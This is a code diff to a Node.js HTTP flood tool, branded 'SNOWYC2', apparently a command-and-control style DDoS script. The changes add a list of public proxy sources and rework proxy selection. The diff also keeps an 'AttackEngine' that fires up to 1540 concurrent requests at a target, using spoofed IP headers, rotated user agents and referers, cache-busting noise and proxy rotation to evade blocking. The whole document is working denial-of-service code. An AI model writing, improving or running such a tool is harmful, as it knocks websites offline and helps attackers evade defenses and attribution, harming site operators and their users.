@@ -8,16 +8,18 @@ const process = require('process');
 const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540);
 const REQUEST_TIMEOUT = 8000;
 
-const REFERERS = loadLines('refs.txt');
-const USER_AGENTS = loadLines('ua.txt');
-const FILE_PROXIES = loadLines('proxies.txt').concat(loadLines('proxy2.txt'));
-
-const UA_POOL = Array.from({ length: 10000 }, () =>
-    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0'
-);
-
-const keepAliveHttp = new http.Agent({ keepAlive: true });
-const keepAliveHttps = new https.Agent({ keepAlive: true });
+const PROXY_SOURCES = [
+    'https://sts-proxies.vercel.app/v2/',
+    'https://www.proxy-list.download/api/v1/get?type=http',
+    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
+    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
+    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
+    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
+    'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt',
+    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
+    'https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt'
+];
 
 function loadLines(filename) {
     try {
@@ -30,32 +32,35 @@ function loadLines(filename) {
     }
 }
 
+const REFERERS = loadLines('refs.txt');
+const USER_AGENTS = loadLines('ua.txt');
+const UA_POOL = Array.from({ length: 10000 }, () =>
+    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0'
+);
+
+const keepAliveHttp = new http.Agent({ keepAlive: true });
+const keepAliveHttps = new https.Agent({ keepAlive: true });
+
 async function fetchProxies() {
-    const urls = [
-        'https://sts-proxies.vercel.app/v2/',
-        'https://www.proxy-list.download/api/v1/get?type=http',
-        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
+    const localProxies = [
+        ...loadLines('proxies.txt'),
+        ...loadLines('proxy2.txt')
     ];
 
-    let proxies = [...FILE_PROXIES];
-    const promises = urls.map(async (url) => {
-        try {
-            const res = await axios.get(url);
-            let data = res.data;
-            if (data.proxies) data = data.proxies;
-            if (typeof data === 'string') {
-                proxies = proxies.concat(data.split('\n').map(p => p.trim()).filter(p => p.includes(':')));
-            }
-        } catch {
-            // don’t block, just skip
+    const remotePromises = PROXY_SOURCES.map(url =>
+        axios.get(url).then(res => res.data).catch(() => '')
+    );
+
+    const responses = await Promise.allSettled(remotePromises);
+
+    const remoteProxies = responses.flatMap(res => {
+        if (res.status === 'fulfilled') {
+            return res.value.split('\n').map(p => p.trim()).filter(p => p.includes(':'));
         }
+        return [];
     });
 
-    setTimeout(() => {}, 5000); // Let them load but don't block
-
-    Promise.all(promises); // Load silently in background
-
-    return [...new Set(proxies)];
+    return Array.from(new Set([...localProxies, ...remoteProxies]));
 }
 
 class AttackEngine {
@@ -80,13 +85,11 @@ class AttackEngine {
     }
 
     getRandomProxy() {
-        if (this.goodProxies.size && Math.random() < 0.8) {
-            // Prioritize good proxies
-            const list = Array.from(this.goodProxies);
-            return list[Math.floor(Math.random() * list.length)];
-        } else {
-            return this.allProxies[Math.floor(Math.random() * this.allProxies.length)];
-        }
+        const pool = this.goodProxies.size > 10 ? Array.from(this.goodProxies) : this.allProxies;
+        const proxy = pool[Math.floor(Math.random() * pool.length)];
+        if (!proxy || !proxy.includes(':')) return null;
+        const [host, port] = proxy.split(':');
+        return { host, port: parseInt(port) };
     }
 
     getRandomUA() {
@@ -99,7 +102,8 @@ class AttackEngine {
     }
 
     async makeRequest() {
-        const useProxy = Math.random() < 0.7;
+        const useProxy = Math.random() < 0.5; // 50% chance proxy, 50% VPS IP
+
         const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
         const headers = {
             'User-Agent': this.getRandomUA(),
@@ -116,7 +120,6 @@ class AttackEngine {
         };
 
         const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
-
         const config = {
             headers,
             timeout: REQUEST_TIMEOUT,
@@ -125,26 +128,24 @@ class AttackEngine {
             validateStatus: null
         };
 
+        let proxy = null;
         if (useProxy) {
-            const proxy = this.getRandomProxy();
-            if (proxy && proxy.includes(':')) {
-                const [host, port] = proxy.split(':');
-                config.proxy = { host, port: parseInt(port) };
+            proxy = this.getRandomProxy();
+            if (proxy) {
+                config.proxy = { host: proxy.host, port: proxy.port };
+            } else {
+                return; // skip if no proxy available
             }
         }
 
         try {
-            const res = await axios.get(urlWithNoise, config);
-            if (res.status === 200) {
+            const response = await axios.get(urlWithNoise, config);
+            if (response.status === 200) {
                 this.stats.success++;
-                if (useProxy && config.proxy) {
-                    this.goodProxies.add(`${config.proxy.host}:${config.proxy.port}`);
-                }
+                if (proxy) this.goodProxies.add(`${proxy.host}:${proxy.port}`);
                 return;
             }
-        } catch {
-            // ignore
-        }
+        } catch {}
 
         this.stats.errors++;
     }
@@ -165,28 +166,6 @@ class AttackEngine {
     }
 
     async runAttack() {
-        this.showIntro();
-        await this.loadProxies();
-
-        let lastTotal = 0;
-        const printStats = setInterval(() => {
-            const elapsed = (Date.now() - this.startTime) / 1000;
-            const currentRps = (this.stats.total - lastTotal) / 0.2;
-            lastTotal = this.stats.total;
-            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
-
-            process.stdout.write(
-                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
-            );
-        }, 200);
-
-        await this.startWorkers();
-        this.running = false;
-        clearInterval(printStats);
-        this.printSummary();
-    }
-
-    showIntro() {
         console.clear();
         console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
         console.log('  ============================================');
@@ -194,6 +173,20 @@ class AttackEngine {
         console.log(`  TIME:   ${this.duration / 1000}s`);
         console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
         console.log('  ============================================\n');
+
+        let lastTotal = 0;
+        const printStats = setInterval(() => {
+            const currentRps = (this.stats.total - lastTotal) / 0.2;
+            lastTotal = this.stats.total;
+            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
+            process.stdout.write(`\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `);
+        }, 200);
+
+        await this.loadProxies();
+        await this.startWorkers();
+        this.running = false;
+        clearInterval(printStats);
+        this.printSummary();
     }
 
     printSummary() {
